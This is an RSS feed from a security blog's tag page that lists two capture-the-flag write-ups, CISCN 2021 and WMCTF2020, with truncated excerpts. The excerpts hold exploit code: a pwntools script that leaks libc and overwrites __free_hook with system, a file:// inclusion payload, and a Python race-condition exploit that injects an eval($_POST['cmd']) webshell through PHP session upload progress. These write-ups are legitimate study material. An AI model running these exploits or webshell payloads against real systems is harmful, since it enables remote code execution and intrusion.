<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>session.upload_progress on wh1sper</title>
    <link>https://anthem-whisper.github.io/tags/session.upload_progress/</link>
    <description>Recent content in session.upload_progress on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <lastBuildDate>Sun, 16 May 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/session.upload_progress/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CISCN 2021 Quals Writeup by X1cT34m</title>
      <link>https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-by-x1ct34m/</link>
      <pubDate>Sun, 16 May 2021 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/ciscn-2021-quals-writeup-by-x1ct34m/</guid>
      <description>Pwn pwny 越界任意写
from pwn import* def menu(ch): p.sendlineafter(&amp;#39;choice:&amp;#39;,str(ch)) p = process(&amp;#39;./main&amp;#39;) libc = ELF(&amp;#39;./libc-2.27.so&amp;#39;) p = remote(&amp;#39;124.70.35.238&amp;#39;,23807) menu(2) p.sendlineafter(&amp;#39;Index:&amp;#39;,&amp;#39;256&amp;#39;) menu(2) p.sendlineafter(&amp;#39;Index:&amp;#39;,&amp;#39;256&amp;#39;) menu(1) p.sendlineafter(&amp;#39;Index:&amp;#39;,p64((-8&amp;amp;0xFFFFFFFFFFFFFFFF))) p.recvuntil(&amp;#39;Result: &amp;#39;) libc_base = int(p.recv(12),16) - libc.sym[&amp;#39;_IO_2_1_stdout_&amp;#39;] log.info(&amp;#39;LIBC:\t&amp;#39; + hex(libc_base)) menu(1) p.sendlineafter(&amp;#39;Index:&amp;#39;,p64((-11&amp;amp;0xFFFFFFFFFFFFFFFF))) p.recvuntil(&amp;#39;Result: &amp;#39;) proc_base = int(p.recv(12),16) - 0x202008 log.info(&amp;#39;PROC:\t&amp;#39; + hex(proc_base)) free_hook = libc_base + libc.sym[&amp;#39;__free_hook&amp;#39;] L = proc_base + 0x202060 offset = (free_hook - L)/8 menu(2) p.sendlineafter(&amp;#39;Index:&amp;#39;,str(offset)) p.send(p64(libc_base + libc.sym[&amp;#39;system&amp;#39;])) IO_list_all = libc_base + libc.</description>
    </item>
    
    <item>
      <title>W&amp;MCTF2020</title>
      <link>https://anthem-whisper.github.io/p/wmctf2020/</link>
      <pubDate>Mon, 03 Aug 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/wmctf2020/</guid>
      <description>0day大战，，，打不动，告辞
 web_checkin 考点：文件包含file协议
&amp;lt;?php//PHP 7.0.33 Apache/2.4.25error_reporting(0);$sandbox = &#39;/var/www/html/&#39; . md5($_SERVER[&#39;REMOTE_ADDR&#39;]);@mkdir($sandbox);@chdir($sandbox);highlight_file(__FILE__);if(isset($_GET[&#39;content&#39;])) {$content = $_GET[&#39;content&#39;];if(preg_match(&#39;/iconv|UCS|UTF|rot|quoted|base64/i&#39;,$content))die(&#39;hacker&#39;);if(file_exists($content))require_once($content);file_put_contents($content,&#39;&amp;lt;?php exit();&#39;.$content);}直接file读取根目录flag
?content=file:///flagWMCTF{a1sc8591as98c1a96s85c165as1cas7d89}
Make PHP Great Again 考点：session.upload_progress文件包含，条件竞争
referer:https://www.freebuf.com/news/202819.html
exp:
#coding=utf-8import ioimport requestsimport threadingsessid = &#39;TGAO&#39;data = {&amp;quot;cmd&amp;quot;:&amp;quot;system(&#39;tac /var/www/html/flag.php&#39;);&amp;quot;}def write(session):while True:f = io.BytesIO(b&#39;a&#39; *100* 50)resp = session.post( &#39;http://no_body_knows_php_better_than_me.glzjin.wmctf.wetolink.com&#39;, data={&#39;PHP_SESSION_UPLOAD_PROGRESS&#39;: &#39;&amp;lt;?php eval($_POST[&amp;quot;cmd&amp;quot;]);?&amp;gt;&#39;}, files={&#39;file&#39;: (&#39;tgao.</description>
    </item>
    
  </channel>
</rss>
